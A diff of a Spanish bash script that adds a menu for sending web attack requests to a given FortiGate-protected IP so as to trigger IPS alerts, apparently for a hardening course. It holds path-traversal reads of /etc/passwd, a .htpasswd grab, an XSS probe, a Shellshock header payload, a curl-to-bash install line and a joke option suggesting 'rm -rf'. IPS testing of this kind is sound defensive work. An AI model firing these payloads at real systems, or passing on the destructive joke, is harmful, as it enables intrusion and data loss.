@@ -9,7 +9,11 @@
 # Script de NiPeGun para instalar realizar ataques IPS a un FortiGate
 #
 # Ejecución remota con sudo:
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | bash
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | bash -s "172.16.0.209"
+# ----------
+
+vIP="$1"
+
 # ----------
 
 # Definir constantes de color
@@ -55,96 +59,95 @@
     exit
   fi
 
-vIP="$1"
-
-
-
 # Crear el menú
-      # Comprobar si el paquete dialog está instalado. Si no lo está, instalarlo.
-        if [[ $(dpkg-query -s dialog 2>/dev/null | grep installed) == "" ]]; then
-          echo ""
-          echo -e "${cColorRojo}  El paquete dialog no está instalado. Iniciando su instalación...${cFinColor}"
-          echo ""
-          apt-get -y update
-          apt-get -y install dialog
-          echo ""
-        fi
-      #menu=(dialog --timeout 5 --checklist "Marca las opciones que quieras instalar:" 22 96 16)
-      menu=(dialog --checklist "Marca las opciones que quieras instalar:" 22 96 16)
-        opciones=(
-          1 "Opción 1" on
-          2 "Opción 2" off
-          3 "Opción 3" off
-          4 "Opción 4" off
-          5 "Opción 5" off
-        )
-      choices=$("${menu[@]}" "${opciones[@]}" 2>&1 >/dev/tty)
-      #clear
+  # Comprobar si el paquete dialog está instalado. Si no lo está, instalarlo.
+    if [[ $(dpkg-query -s dialog 2>/dev/null | grep installed) == "" ]]; then
+      echo ""
+      echo -e "${cColorRojo}  El paquete dialog no está instalado. Iniciando su instalación...${cFinColor}"
+      echo ""
+      apt-get -y update
+      apt-get -y install dialog
+      echo ""
+    fi
+  menu=(dialog --checklist "Que tipo de ataque deseas ejecutar:" 22 96 16)
+    opciones=(
+      1 "Web.Server.Password.File.Access"                 on
+      2 "HTPasswd.Access"                                 off
+      3 "Cross.Site.Scripting"                            off
+      4 "Generic.Path.Traversal.Detection"                off
+      5 "Bash.Function.Definitions.Remote.Code.Execution" off
+      6 "Odio a Iñigo 24"                                 off
+    )
+  choices=$("${menu[@]}" "${opciones[@]}" 2>&1 >/dev/tty)
+    for choice in $choices
+      do
+        case $choice in
 
-      for choice in $choices
-        do
-          case $choice in
+          1)
 
-            1)
+            echo ""
+            echo "  Opción 1..."
+            echo ""
+            # Alerta: Web.Server.Password.File.Access
+               curl -X GET "http://"$vIP":80/../../etc/passwd"
+  
+          ;;
 
-              echo ""
-              echo "  Opción 1..."
-              echo ""
+          2)
 
-            ;;
+            echo ""
+            echo "  HTPasswd.Access..."
+            echo ""
+            # Alerta: HTPasswd.Access
+              curl -X GET "http://"$vIP":80/.htpasswd"
+  
+          ;;
 
-            2)
+          3)
 
-              echo ""
-              echo "  Opción 2..."
-              echo ""
+            echo ""
+            echo "  Opción 3..."
+            echo ""
+            # Alerta: Cross.Site.Scripting
+              curl -X GET "http://"$vIP":80/search?query=<script>alert('XSS')</script>"
 
-            ;;
+          ;;
 
-            3)
+          4)
 
-              echo ""
-              echo "  Opción 3..."
-              echo ""
+            echo ""
+            echo "  Opción 4..."
+            echo ""
+            # Alerta: Generic.Path.Traversal.Detection
+              curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"
+  
+          ;;
 
-            ;;
+          5)
 
-            4)
+            echo ""
+            echo "  Opción 5..."
+            echo ""
+            # Alerta: Bash.Function.Definitions.Remote.Code.Execution
+              curl -X GET "http://"$vIP":80" -H "User-Agent: () { :; }; echo 'Exploit'"
 
-              echo ""
-              echo "  Opción 4..."
-              echo ""
+          ;;
 
-            ;;
+          6)
 
-            5)
+            echo ""
+            echo "  Has suspendido bastgionado, por listo!  Sin embargo..."
+            echo ""
+            echo "  Si borras el idioma fránces del sistema, podrás sacar, al menos, un 5."
+            echo ""
+            echo "  Puedes hacerlo con:"
+            echo ""
+            echo "  rm -rf ...    (de remove rapidly french)"
+            echo ""
 
-              echo ""
-              echo "  Opción 5..."
-              echo ""
+          ;;
 
-            ;;
+      esac
 
-        esac
+  done
 
-    done
-
-
-
-
-
-
-# Alerta: Web.Server.Password.File.Access
-  curl -X GET "http://"$vIP":80/../../etc/passwd"
-
-# Alerta: HTPasswd.Access
-  curl -X GET "http://"$vIP":80/.htpasswd"
-
-# Alerta: Cross.Site.Scripting
-  curl -X GET "http://"$vIP":80/search?query=<script>alert('XSS')</script>"
-
-# Alerta: Generic.Path.Traversal.Detection
-  curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"
-
-# Alerta: Bash.Function.Definitions.Remote.Code.Execution
-  curl -X GET "http://"$vIP":80" -H "User-Agent: () { :; }; echo 'Exploit'"
